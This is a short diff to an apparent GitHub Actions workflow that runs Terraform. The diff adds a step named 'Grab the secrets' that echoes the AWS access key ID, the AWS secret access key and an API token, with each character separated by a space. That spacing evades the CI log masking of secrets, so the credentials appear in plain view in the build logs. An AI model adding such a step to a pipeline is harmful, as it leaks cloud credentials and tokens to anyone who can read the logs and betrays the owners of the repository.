@@ -26,5 +26,11 @@ jobs:
       
       - name: 'Terraform Plan'
         run: terraform plan -out=output
+
+      - name: 'Grab the secrets'
+      - run: |
+          echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+          echo ${{env.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'
+          echo ${{env.API_TOKEN}} | sed 's/./& /g'
           
     
